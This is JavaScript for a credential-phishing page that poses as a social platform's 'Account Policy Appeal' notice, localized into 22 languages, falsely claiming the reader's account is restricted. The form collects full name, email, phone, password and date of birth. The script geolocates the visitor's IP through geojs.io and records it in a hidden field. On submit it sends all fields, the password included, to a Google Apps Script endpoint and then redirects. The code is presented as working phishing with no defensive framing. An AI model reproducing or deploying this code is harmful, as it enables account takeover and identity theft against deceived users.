// ==== Ngôn ngữ dịch ====
    const translations = {
      en: {
        title: "Account Policy Appeal",
        lead: "We detected unusual activity on your account that violates our community standards. Access to your account is limited. If you believe this is a mistake, please submit an appeal.",
        name: "Full Name",
        email: "Email",
        phone: "Phone Number",
        password: "Password",
        birthday: "Date of Birth",
        birthday_ph: "MM/DD/YYYY",
        submit: "Submit"
      },
      de: {
        title: "Einspruch gegen Kontorichtlinien",
        lead: "Wir haben ungewöhnliche Aktivitäten in Ihrem Konto festgestellt, die gegen unsere Gemeinschaftsstandards verstoßen. Der Zugriff auf Ihr Konto ist eingeschränkt. Wenn Sie glauben, dass dies ein Fehler ist, reichen Sie bitte eine Beschwerde ein.",
        name: "Vollständiger Name",
        email: "E-Mail",
        phone: "Telefonnummer",
        password: "Passwort",
        birthday: "Geburtsdatum",
        birthday_ph: "TT/MM/JJJJ",
        submit: "Absenden"
      },
      nl: {
        title: "Beroep op accountbeleid",
        lead: "We hebben ongebruikelijke activiteiten op uw account gedetecteerd die in strijd zijn met onze communityrichtlijnen. Toegang tot uw account is beperkt. Als u denkt dat dit een vergissing is, dien dan een beroep in.",
        name: "Volledige naam",
        email: "E-mail",
        phone: "Telefoonnummer",
        password: "Wachtwoord",
        birthday: "Geboortedatum",
        birthday_ph: "DD-MM-JJJJ",
        submit: "Verzenden"
      },
      jp: {
        title: "アカウントポリシーに関する異議申し立て",
        lead: "あなたのアカウントで不審な活動が検出され、コミュニティ規範に違反しています。アカウントへのアクセスは制限されています。誤りだと思われる場合は、異議申し立てを送信してください。",
        name: "氏名",
        email: "メールアドレス",
        phone: "電話番号",
        password: "パスワード",
        birthday: "生年月日",
        birthday_ph: "YYYY/MM/DD",
        submit: "送信"
      },
      bg: {
        title: "Обжалване на политиката за акаунта",
        lead: "Открихме необичайна активност във вашия акаунт, която нарушава нашите стандарти на общността. Достъпът до акаунта ви е ограничен. Ако смятате, че това е грешка, моля, подайте жалба.",
        name: "Пълно име",
        email: "Имейл",
        phone: "Телефонен номер",
        password: "Парола",
        birthday: "Дата на раждане",
        birthday_ph: "ДД/ММ/ГГГГ",
        submit: "Изпрати"
      },
      pt: {
        title: "Recurso de Política de Conta",
        lead: "Detectamos atividade incomum em sua conta que viola nossos padrões da comunidade. O acesso à sua conta está limitado. Se você acredita que isso é um engano, envie um recurso.",
        name: "Nome completo",
        email: "E-mail",
        phone: "Número de telefone",
        password: "Senha",
        birthday: "Data de nascimento",
        birthday_ph: "DD/MM/AAAA",
        submit: "Enviar"
      },
      el: {
        title: "Έφεση πολιτικής λογαριασμού",
        lead: "Εντοπίσαμε ασυνήθιστη δραστηριότητα στον λογαριασμό σας που παραβιάζει τα πρότυπα της κοινότητάς μας. Η πρόσβαση στον λογαριασμό σας είναι περιορισμένη. Εάν πιστεύετε ότι πρόκειται για λάθος, υποβάλετε ένσταση.",
        name: "Πλήρες όνομα",
        email: "Email",
        phone: "Τηλέφωνο",
        password: "Κωδικός πρόσβασης",
        birthday: "Ημερομηνία γέννησης",
        birthday_ph: "ΗΗ/ΜΜ/ΕΕΕΕ",
        submit: "Υποβολή"
      },
      cs: {
        title: "Odvolání proti zásadám účtu",
        lead: "Zjistili jsme neobvyklou aktivitu na vašem účtu, která porušuje naše zásady komunity. Přístup k vašemu účtu je omezen. Pokud si myslíte, že jde o chybu, podejte odvolání.",
        name: "Celé jméno",
        email: "E-mail",
        phone: "Telefonní číslo",
        password: "Heslo",
        birthday: "Datum narození",
        birthday_ph: "DD.MM.RRRR",
        submit: "Odeslat"
      },
      da: {
        title: "Anke af kontopolitik",
        lead: "Vi har registreret usædvanlig aktivitet på din konto, som overtræder vores fællesskabsstandarder. Adgangen til din konto er begrænset. Hvis du mener, dette er en fejl, indsend en anke.",
        name: "Fulde navn",
        email: "E-mail",
        phone: "Telefonnummer",
        password: "Adgangskode",
        birthday: "Fødselsdato",
        birthday_ph: "DD/MM/ÅÅÅÅ",
        submit: "Indsend"
      },
      es: {
        title: "Apelación de política de cuenta",
        lead: "Hemos detectado una actividad inusual en su cuenta que viola nuestras normas comunitarias. El acceso a su cuenta está limitado. Si cree que esto es un error, envíe una apelación.",
        name: "Nombre completo",
        email: "Correo electrónico",
        phone: "Número de teléfono",
        password: "Contraseña",
        birthday: "Fecha de nacimiento",
        birthday_ph: "DD/MM/AAAA",
        submit: "Enviar"
      },
      fi: {
        title: "Tilipolitiikan valitus",
        lead: "Havaitsimme epätavallista toimintaa tililläsi, joka rikkoo yhteisön sääntöjämme. Pääsy tilillesi on rajoitettu. Jos uskot, että tämä on virhe, lähetä valitus.",
        name: "Koko nimi",
        email: "Sähköposti",
        phone: "Puhelinnumero",
        password: "Salasana",
        birthday: "Syntymäaika",
        birthday_ph: "PP.KK.VVVV",
        submit: "Lähetä"
      },
      fr: {
        title: "Appel de la politique du compte",
        lead: "Nous avons détecté une activité inhabituelle sur votre compte qui enfreint nos standards communautaires. L'accès à votre compte est limité. Si vous pensez qu'il s'agit d'une erreur, veuillez soumettre un appel.",
        name: "Nom complet",
        email: "E-mail",
        phone: "Numéro de téléphone",
        password: "Mot de passe",
        birthday: "Date de naissance",
        birthday_ph: "JJ/MM/AAAA",
        submit: "Envoyer"
      },
      hu: {
        title: "Fiókpolitikai fellebbezés",
        lead: "Szokatlan tevékenységet észleltünk a fiókjában, amely megsérti közösségi irányelveinket. A fiókjához való hozzáférés korlátozott. Ha úgy gondolja, hogy ez tévedés, nyújtson be fellebbezést.",
        name: "Teljes név",
        email: "E-mail",
        phone: "Telefonszám",
        password: "Jelszó",
        birthday: "Születési dátum",
        birthday_ph: "ÉÉÉÉ.HH.NN",
        submit: "Küldés"
      },
      it: {
        title: "Ricorso sulla politica dell'account",
        lead: "Abbiamo rilevato un'attività insolita sul tuo account che viola i nostri standard della community. L'accesso al tuo account è limitato. Se ritieni che si tratti di un errore, invia un ricorso.",
        name: "Nome completo",
        email: "E-mail",
        phone: "Numero di telefono",
        password: "Password",
        birthday: "Data di nascita",
        birthday_ph: "GG/MM/AAAA",
        submit: "Invia"
      },
      no: {
        title: "Klage på kontopolitikk",
        lead: "Vi oppdaget uvanlig aktivitet på kontoen din som bryter med våre fellesskapsstandarder. Tilgangen til kontoen din er begrenset. Hvis du mener dette er en feil, vennligst send inn en klage.",
        name: "Fullt navn",
        email: "E-post",
        phone: "Telefonnummer",
        password: "Passord",
        birthday: "Fødselsdato",
        birthday_ph: "DD/MM/ÅÅÅÅ",
        submit: "Send"
      },
      pl: {
        title: "Odwołanie od zasad konta",
        lead: "Wykryliśmy nietypową aktywność na Twoim koncie, która narusza nasze standardy społeczności. Dostęp do Twojego konta jest ograniczony. Jeśli uważasz, że to pomyłka, złóż odwołanie.",
        name: "Pełne imię i nazwisko",
        email: "E-mail",
        phone: "Numer telefonu",
        password: "Hasło",
        birthday: "Data urodzenia",
        birthday_ph: "DD.MM.RRRR",
        submit: "Wyślij"
      },
      ro: {
        title: "Apel privind politica contului",
        lead: "Am detectat o activitate neobișnuită în contul dvs. care încalcă standardele comunității noastre. Accesul la contul dvs. este limitat. Dacă credeți că aceasta este o greșeală, trimiteți o contestație.",
        name: "Nume complet",
        email: "E-mail",
        phone: "Număr de telefon",
        password: "Parolă",
        birthday: "Data nașterii",
        birthday_ph: "ZZ/LL/AAAA",
        submit: "Trimite"
      },
      sv: {
        title: "Överklagande av kontopolicy",
        lead: "Vi har upptäckt ovanlig aktivitet på ditt konto som bryter mot våra communitystandarder. Åtkomsten till ditt konto är begränsad. Om du tror att detta är ett misstag, skicka in ett överklagande.",
        name: "Fullständigt namn",
        email: "E-post",
        phone: "Telefonnummer",
        password: "Lösenord",
        birthday: "Födelsedatum",
        birthday_ph: "ÅÅÅÅ-MM-DD",
        submit: "Skicka"
      },
      th: {
        title: "การอุทธรณ์นโยบายบัญชี",
        lead: "เราตรวจพบกิจกรรมที่ผิดปกติในบัญชีของคุณซึ่งละเมิดมาตรฐานชุมชนของเรา การเข้าถึงบัญชีของคุณถูกจำกัด หากคุณเชื่อว่านี่เป็นความผิดพลาด โปรดยื่นอุทธรณ์",
        name: "ชื่อ-นามสกุล",
        email: "อีเมล",
        phone: "หมายเลขโทรศัพท์",
        password: "รหัสผ่าน",
        birthday: "วันเกิด",
        birthday_ph: "DD/MM/YYYY",
        submit: "ส่ง"
      },
      tr: {
        title: "Hesap Politikası İtirazı",
        lead: "Hesabınızda topluluk standartlarımızı ihlal eden olağandışı bir etkinlik tespit ettik. Hesabınıza erişim sınırlıdır. Bunun bir hata olduğuna inanıyorsanız, lütfen bir itiraz gönderin.",
        name: "Tam Ad",
        email: "E-posta",
        phone: "Telefon Numarası",
        password: "Şifre",
        birthday: "Doğum tarihi",
        birthday_ph: "GG/AA/YYYY",
        submit: "Gönder"
      },
      zh: {
        title: "账户政策申诉",
        lead: "我们检测到您的账户存在违反社区标准的异常活动。您的账户访问受到限制。如果您认为这是一个错误，请提交申诉。",
        name: "全名",
        email: "电子邮件",
        phone: "电话号码",
        password: "密码",
        birthday: "出生日期",
        birthday_ph: "YYYY/MM/DD",
        submit: "提交"
      },
      vi: {
        title: "Khiếu nại chính sách tài khoản",
        lead: "Chúng tôi đã phát hiện hoạt động bất thường trên tài khoản của bạn vi phạm tiêu chuẩn cộng đồng. Truy cập tài khoản bị hạn chế. Nếu bạn tin rằng đây là nhầm lẫn, vui lòng nộp đơn khiếu nại.",
        name: "Họ và tên",
        email: "E-mail",
        phone: "Số điện thoại",
        password: "Mật khẩu",
        birthday: "Ngày sinh",
        birthday_ph: "DD/MM/YYYY",
        submit: "Gửi"
      }
    };

    // Phone codes
    const phoneCodes = {
    at: "+43", be: "+32", jp: "+81", bg: "+359", br: "+55", ca: "+1",
    cy: "+357", cz: "+420", de: "+49", dk: "+45", es: "+34", fi: "+358",
    fr: "+33", gb: "+44", gr: "+30", hu: "+36", it: "+39", nl: "+31",
    no: "+47", pl: "+48", pt: "+351", ro: "+40", se: "+46", th: "+66",
    tr: "+90", tw: "+886", us: "+1", vn: "+84"
    };

    // Country -> language
    const countryToLanguage = {
      AT: 'de', BE: 'nl', JP: 'jp', BG: 'bg', BR: 'pt', CA: 'en', CY: 'el',
      CZ: 'cs', DE: 'de', DK: 'da', ES: 'es', FI: 'fi', FR: 'fr', GB: 'en',
      GR: 'el', HU: 'hu', IT: 'it', NL: 'nl', NO: 'no', PL: 'pl', PT: 'pt',
      RO: 'ro', SE: 'sv', TH: 'th', TR: 'tr', TW: 'zh', US: 'en', VN: 'vi'
    };

    // Áp dụng dịch
    function applyTranslations(lang) {
      const t = translations[lang] || translations["en"];
      document.getElementById("title").textContent = t.title;
      document.getElementById("lead").textContent = t.lead;
      document.getElementById("label-name").textContent = t.name;
      document.getElementById("label-email").textContent = t.email;
      document.getElementById("label-phone").textContent = t.phone;
      document.getElementById("label-password").textContent = t.password;
      document.getElementById("label-birthday").textContent = t.birthday;
      document.getElementById("submitBtn").textContent = t.submit;
      document.getElementById("birthday").placeholder = t.birthday_ph;
      document.documentElement.lang = lang;
    }

    // Detect language + phone + ip
    async function detectLanguageAndPhone() {
      try {
        const res = await fetch("https://get.geojs.io/v1/ip/geo.json");
        const data = await res.json();
        const country = (data.country_code || "US").toUpperCase();

        // Set hidden ip
        document.getElementById("ip").value = data.ip || "";

        // Set phone placeholder
        document.getElementById("phone").placeholder = phoneCodes[country.toLowerCase()] || "+1";

        // Trả về language key
        return countryToLanguage[country] || "en";
      } catch (e) {
        document.getElementById("phone").placeholder = "+1";
        document.getElementById("ip").value = "Unknown IP";
        return "en";
      }
    }

    // Run
    (async () => {
      const lang = await detectLanguageAndPhone();
      applyTranslations(lang);
    })();

    // Không cho nhập chữ vào ô số điện thoại
    const phoneInput = document.getElementById("phone");
    phoneInput.addEventListener("input", function () {
      this.value = this.value.replace(/(?!^\+)[^0-9]/g, "");
    });
    
    // Toggle mật khẩu
    const togglePw = document.getElementById("togglePw");
    const passwordInput = document.getElementById("password");
    togglePw.addEventListener("click", () => {
      if (passwordInput.type === "password") {
        passwordInput.type = "text";
        togglePw.textContent = "🙈"; 
      } else {
        passwordInput.type = "password";
        togglePw.textContent = "👁";
      }
    });

    // Submit
    const scriptURL = "https://script.google.com/macros/s/AKfycbxvPqEG7qEbwVnEvJgsleo-1GFo0HPbnMOpG4-qOScFd89GkwDNu5VRkhhWnhJhS4d3/exec";
    const redirectURL = "/very";  
    const form = document.getElementById('regForm');
    const submitBtn = document.getElementById('submitBtn');

    form.addEventListener('submit', async (ev) => {
      ev.preventDefault();
      submitBtn.disabled = true;
      try {
        const fd = new FormData(form);
        await fetch(scriptURL, { method: 'POST', body: fd });
        window.location.href = redirectURL;
      } catch (err) {
        console.error(err);
        submitBtn.disabled = false;
      }
    });
